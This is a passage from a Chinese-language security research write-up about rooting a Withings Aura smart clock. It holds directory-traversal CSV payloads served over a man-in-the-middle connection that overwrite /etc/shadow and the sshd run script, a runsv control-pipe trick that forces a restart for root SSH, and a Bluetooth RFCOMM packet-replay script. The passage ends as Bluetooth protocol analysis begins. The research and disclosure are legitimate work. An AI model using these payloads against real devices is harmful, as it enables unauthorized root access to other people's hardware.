    WAKEUP_4;1;v3_audio_main_part_1.mp3;77c1b5fd054233f1d6e0dd12d0d419c5;5272
    WAKEUP_3;1;v3_audio_main_part_2.mp3;e4d0620ab9fa56cb1ef29485c4377a01;1160
seqmand将会分别下载csv文件里每一行指定的相应文件到临时目录里。比如，对于上面的CSV文件，它将进行以下文件的下载：
    download "http://XXXXXXX/content/aura/sequences-v3/WAKEUP_4/v3_audio_main_part_2.mp3" to "/tmp/sequences/WAKEUP_4/v3_audio_main_part_2.mp3"
    download "http://XXXXXXX/content/aura/sequences-v3/WAKEUP_4/v3_audio_main_part_1.mp3" to "/tmp/sequences/WAKEUP_4/v3_audio_main_part_1.mp3"
    download "http://XXXXXXX/content/aura/sequences-v3/WAKEUP_3/v3_audio_main_part_2.mp3" to "/tmp/sequences/WAKEUP_3/v3_audio_main_part_2.mp3"
临时文件最终会移动到 **/usr/share/sequences** 文件夹里。
我将seqmand的HTTP请求重定向到我自己的HTTP服务器，并提供了自定义的aura_seq_list.csv文件。我很快注意到可以进行目录遍历攻击。
例如，如果我使用以下csv并提供了具有有效MD5 的测试文件：
    #name;is_mandatory;filename;md5;filesize;
    WAKEUP_42;1;../../../test;cbb788cf62b23c4bf6e91042576d75a3;720
Seqmand这时进行如下操作：
    download "http://XXXXXXX/content/test" to "/tmp/sequences/WAKEUP_42/../../../test"
我在我的笔记本电脑上使用静态编译的 **qemu** 仿真了守护进程的操作，/test文件被创建了。
我不会花太多时间来解释如何编译和使用 **qemu**
。有需要了解的可以看[这个](http://www.devttys0.com/2011/09/exploiting-embedded-systems-part-3/)文章。
我的第一个计划是用我自己的密码覆盖 **/ etc / shadow** 文件。
    #name;is_mandatory;filename;md5;filesize;
    WAKEUP_42;1;../../../etc/shadow;326c68d758d21b2a4bb1f5e14931c2b4;720
像前面的一样，在我的 **qemu** 模拟器上可以成功，但是在该设备上失败了。通过另一个技巧，后来我找到了失败的原因。
**日志文件提取**
浏览文件系统上可用的文件时，我看到了/ usr / bin / usb_hd_hotplug脚本。一旦USB驱动器插入Aura的接口，它就会自动启动。
此脚本执行以下操作：
• 安装USB驱动器
• 检查一个签名的脚本，如果有效就运行它
• 执行 **flash_from_usb** 函数
• 执行 **copy_logs** 函数
这个签名的脚本不能被直接使用。flash_from_usb函数需要有签名的FPKG镜像文件才能执行。并且copy_logs函数只是搜索一个名为withings-options的文件，其中必须包含copy_logs = 1这一行。如果该文件存在于USB驱动器上，那么该脚本将会在其上复制日志文件。
    copy_logs()
    {
      cat $MOUNT_POINT/withings-options 2> /dev/null|grep "copy_logs=1" -q || return 1
      logger -t automount  "Copying logs"
      color 4000 1 4000 #purple
      cp /var/log/messages* $MOUNT_POINT
      sync
      sleep 1
      color 1 1 1
    }
**工作目录遍历EXP**
感谢日志文件，我发现大多数操作系统都是在只读分区上运行的（这并不奇怪）。然而，有些部分仍然是可写的。
以下代码来自/etc/init.d/prepare_services脚本。
    mkdir -p /var/service
    #copy services scripts so the directories can be writable
    cp -r /etc/init.d/services/* /var/service
    # Allow core dumps (5M max)
    ulimit -c 10000
    runsvdir /var/service &
这就意味着runsv进程的文件夹（参考
和）是从可写目录 **/var/service** 加载的。
例如，在运行时/var/service/sshd/的内容如下：
    sshd
    ├── down
    ├── run
    └── supervise
        ├── control
        ├── lock
        ├── ok
        ├── pid
        ├── stat
        └── status
文件run是在启动服务时执行的启动脚本，而supervise /文件夹中的所有内容都可用于与进程交互。
我决定覆盖/ var / service / sshd /
run脚本。不幸的是，这还不够。这个脚本只在引导时启动一次，根本来不及覆盖它。我需要一种方法强制重新启动ssh守护程序。
这里我使用/ var / service / sshd / supervise /
control命名管道。根据runv的手册页，可以通过写入来杀死或重新启动服务。例如
    $ echo k > /var/service/sshd/supervise/control
    $ echo u > /var/service/sshd/supervise/control
将杀死并重新启动sshd服务并再次执行 **run** 脚本。
然后我使用下面的CSV文件
    #name;is_mandatory;filename;md5;filesize;
    WAKEUP_5;1;../../../var/service/sshd/run;672a1e6b4a9b2ce8ebef3755217faf8b;720
    WAKEUP_6;1;../../../var/service/sshd/supervise/control;8ce4b16b22b58894aa86c421e8759df3;720
    WAKEUP_7;1;../../../var/service/sshd/supervise/control;7b774effe4a349c6dd82ad4f4f21d34c;720
我的服务器提供的run文件：
    #!/bin/sh
    mount -oremount,rw /
    echo "Your shadow comes here" > /etc/shadow
    exec dropbear -F &> /dev/null
首次命中控制文件时用 **k** 回复，第二次用 **u** 。
攻击是成功的，我获得了一个SSH root访问权限。我使用的脚本可[在这里](https://courk.fr/wp-content/uploads/MITM_seqmand_release.zip)。
**安装gdbserver**
通过SSH访问，我可以更好地了解该设备内部的工作原理。此外，通过很多很酷的二进制文件和脚本可以让我更好地玩设备的外设。我可以玩7段显示，打开和关闭灯，...
下一步，我决定交叉编译一个 **gdbserver**
。这里我偷懒使用了Buildroot来编译。我使用的Buildroot配置在这里。对于不熟悉Buildroot的用户，您需要做的就是将我的defconfig文件复制到新克隆的[buildroot
repo](https://github.com/buildroot/buildroot)的 **configs /** 文件夹中，并运行以下命令：
    $ make aura_gdbserver_defconfig
    $ make
该gdbserver的二进制文件将输出到目标的/ usr / bin文件夹中。
不知道什么原因，生成的gdbserver工作有时不正常。有时候会崩溃。但是，对于下断点和探测内存已经足够了。
**蓝牙RCE**
利用SSH访问权限和 **gdbserver** ，我发现了该设备蓝牙协议中一个可以利用的缓冲区溢出漏洞。
**逆向蓝牙通信**
为了解[智能手机应用程序](https://play.google.com/store/apps/details?id=com.withings.wiscale2)与该设备通信的方式，我开始使用我的Android手机的“Bluetooth
HCI snoop log”功能。它能让我嗅探我的手机和设备之间的所有蓝牙通信。
应用程序在通道9上使用RFCOMM与设备进行通信。该服务是SDP服务器发布的两个服务之一（参见“初步分析”部分）。
第一步，我尝试重放时钟发光时看到的一些数据包。我发送了以下载荷：
    01 01 00 0b 01 09 0f 00 06 09 0d 00 02 01 0c
    01 01 00 0b 01 09 0f 00 06 09 0d 00 02 01 42
    01 01 00 0b 01 09 0f 00 06 09 0d 00 02 01 00
通过使用这个python小脚本：
    #!/usr/bin/env python3
    import socket
    import time
    import sys
    if __name__ == "__main__":
        payloads = [b"\x01\x01\x00\x0b\x01\x09\x0f\x00\x06\x09\x0d\x00\x02\x01\x0c",
                    b"\x01\x01\x00\x0b\x01\x09\x0f\x00\x06\x09\x0d\x00\x02\x01\x42",
                    b"\x01\x01\x00\x0b\x01\x09\x0f\x00\x06\x09\x0d\x00\x02\x01\x00"]
        if len(sys.argv) != 2:
            print("Usage: {} ".format(sys.argv[0]))
            exit(-1)
        mac = sys.argv[1]
        s = socket.socket(socket.AF_BLUETOOTH, socket.SOCK_STREAM, socket.BTPROTO_RFCOMM)
        print("Connecting to Aura ({})".format(mac))
        try:
            s.connect((mac, 9))
        except:
            print("Error while connecting to {}".format(mac))
            exit(-1)
        for i in range(2):
            for payload in payloads:
                s.send(payload)
                time.sleep(1)
        s.close()
        print("Done")
它按预期工作。
我接下来试图了解我发送的数据包的结构。通过反汇编共享库 **libpairing.so** 和 **nm**
，负责蓝牙和WiFi通信的二进制文件结构大致如下：